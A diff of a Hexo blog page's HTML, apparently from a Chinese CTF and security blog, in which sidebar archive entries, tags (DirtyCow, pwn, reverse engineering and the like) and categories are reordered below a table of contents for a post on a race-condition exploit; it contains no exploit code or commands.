class="toc-text">竞争条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">2.6.</span> <span class="toc-text">漏洞原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击"><span class="toc-number">3.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP详解"><span class="toc-number">3.1.</span> <span class="toc-text">EXP详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#write-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">write(2)</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -576,42 +695,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1196,12 +1279,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/素数个数求解与素数的判定/">素数个数求解与素数的判定</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/使用动态规划-DP-解决最大公共子串与最大公共子序列问题/">使用动态规划(DP)解决最大公共子串与最大公共子序列问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/使用动态规划-DP-解决最大公共子串与最大公共子序列问题/">使用动态规划(DP)解决最大公共子串与最大公共子序列问题</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/素数个数求解与素数的判定/">素数个数求解与素数的判定</a>
         </li>
     
     
@@ -1249,65 +1332,65 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
+        <span class="sidebar-tag-name" data-tags="防火墙,iptables"><span class="iconfont-archer">&#xe606;</span>防火墙,iptables</span>
     
         <span class="sidebar-tag-name" data-tags="ACM,数论"><span class="iconfont-archer">&#xe606;</span>ACM,数论</span>
     
-        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
-    
-        <span class="sidebar-tag-name" data-tags="Linux,DirtyCow"><span class="iconfont-archer">&#xe606;</span>Linux,DirtyCow</span>
+        <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
     
         <span class="sidebar-tag-name" data-tags="Linux,LAMP"><span class="iconfont-archer">&#xe606;</span>Linux,LAMP</span>
-    
-        <span class="sidebar-tag-name" data-tags="防火墙,iptables"><span class="iconfont-archer">&#xe606;</span>防火墙,iptables</span>
     
         <span class="sidebar-tag-name" data-tags="SSH,端口转发"><span class="iconfont-archer">&#xe606;</span>SSH,端口转发</span>
     
         <span class="sidebar-tag-name" data-tags="MSF,免杀"><span class="iconfont-archer">&#xe606;</span>MSF,免杀</span>
     
+        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
+    
         <span class="sidebar-tag-name" data-tags="IDA,OllyDB"><span class="iconfont-archer">&#xe606;</span>IDA,OllyDB</span>
     
         <span class="sidebar-tag-name" data-tags="信息收集,社会工程学"><span class="iconfont-archer">&#xe606;</span>信息收集,社会工程学</span>
     
-        <span class="sidebar-tag-name" data-tags="动态规划(DP)"><span class="iconfont-archer">&#xe606;</span>动态规划(DP)</span>
-    
         <span class="sidebar-tag-name" data-tags="花指令,静态调试,Movfuscator"><span class="iconfont-archer">&#xe606;</span>花指令,静态调试,Movfuscator</span>
+    
+        <span class="sidebar-tag-name" data-tags="动态规划(DP)"><span class="iconfont-archer">&#xe606;</span>动态规划(DP)</span>
     
         <span class="sidebar-tag-name" data-tags="PWN,BROP,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,BROP,栈溢出</span>
     
-        <span class="sidebar-tag-name" data-tags="ACM,树状数组"><span class="iconfont-archer">&#xe606;</span>ACM,树状数组</span>
-    
         <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
     
-        <span class="sidebar-tag-name" data-tags="看雪,KCTF,逆向,PWN"><span class="iconfont-archer">&#xe606;</span>看雪,KCTF,逆向,PWN</span>
+        <span class="sidebar-tag-name" data-tags="ACM,树状数组"><span class="iconfont-archer">&#xe606;</span>ACM,树状数组</span>
     
         <span class="sidebar-tag-name" data-tags="工具,python,Netcat"><span class="iconfont-archer">&#xe606;</span>工具,python,Netcat</span>
     
         <span class="sidebar-tag-name" data-tags="工具,python,proxy"><span class="iconfont-archer">&#xe606;</span>工具,python,proxy</span>
     
+        <span class="sidebar-tag-name" data-tags="看雪,KCTF,逆向,PWN"><span class="iconfont-archer">&#xe606;</span>看雪,KCTF,逆向,PWN</span>
+    
         <span class="sidebar-tag-name" data-tags="栈溢出,PWN"><span class="iconfont-archer">&#xe606;</span>栈溢出,PWN</span>
     
         <span class="sidebar-tag-name" data-tags="Linux,GOT,PLT"><span class="iconfont-archer">&#xe606;</span>Linux,GOT,PLT</span>
     
-        <span class="sidebar-tag-name" data-tags="python,多线程"><span class="iconfont-archer">&#xe606;</span>python,多线程</span>
-    
         <span class="sidebar-tag-name" data-tags="pwn,Heap"><span class="iconfont-archer">&#xe606;</span>pwn,Heap</span>
+    
+        <span class="sidebar-tag-name" data-tags="python,多线程"><span class="iconfont-archer">&#xe606;</span>python,多线程</span>
     
         <span class="sidebar-tag-name" data-tags="概率法求素数,算法"><span class="iconfont-archer">&#xe606;</span>概率法求素数,算法</span>
     
         <span class="sidebar-tag-name" data-tags="工具,python,arp_poison"><span class="iconfont-archer">&#xe606;</span>工具,python,arp_poison</span>
     
+        <span class="sidebar-tag-name" data-tags="Linux,DirtyCow"><span class="iconfont-archer">&#xe606;</span>Linux,DirtyCow</span>
+    
         <span class="sidebar-tag-name" data-tags="ctf,web,sql注入"><span class="iconfont-archer">&#xe606;</span>ctf,web,sql注入</span>
     
         <span class="sidebar-tag-name" data-tags="pwn,Format String Vulnerability"><span class="iconfont-archer">&#xe606;</span>pwn,Format String Vulnerability</span>
     
-        <span class="sidebar-tag-name" data-tags="windows,影子账户"><span class="iconfont-archer">&#xe606;</span>windows,影子账户</span>
-    
         <span class="sidebar-tag-name" data-tags="PWN,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,栈溢出</span>
     
-        <span class="sidebar-tag-name" data-tags="ucore,lab0,lab1"><span class="iconfont-archer">&#xe606;</span>ucore,lab0,lab1</span>
+        <span class="sidebar-tag-name" data-tags="windows,影子账户"><span class="iconfont-archer">&#xe606;</span>windows,影子账户</span>
     
         <span class="sidebar-tag-name" data-tags="pwn,堆,glibc"><span class="iconfont-archer">&#xe606;</span>pwn,堆,glibc</span>
+    
+        <span class="sidebar-tag-name" data-tags="ucore,lab0,lab1"><span class="iconfont-archer">&#xe606;</span>ucore,lab0,lab1</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -1342,19 +1425,19 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="CTFweb"><span class="iconfont-archer">&#xe60a;</span>CTFweb</span>
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
     
         <span class="sidebar-category-name" data-categories="ACM"><span class="iconfont-archer">&#xe60a;</span>ACM</span>
     
-        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
-    
-        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+        <span class="sidebar-category-name" data-categories="CTFweb"><span class="iconfont-archer">&#xe60a;</span>CTFweb</span>
     
         <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
     
-        <span class="sidebar-category-name" data-categories="爱的日记"><span class="iconfont-archer">&#xe60a;</span>爱的日记</span>
+        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
     
         <span class="sidebar-category-name" data-categories="社工"><span class="iconfont-archer">&#xe60a;</span>社工</span>
+    
+        <span class="sidebar-category-name" data-categories="爱的日记"><span class="iconfont-archer">&#xe60a;</span>爱的日记</span>
     
         <span class="sidebar-category-name" data-categories="Pwn"><span class="iconfont-archer">&#xe60a;</span>Pwn</span>
     
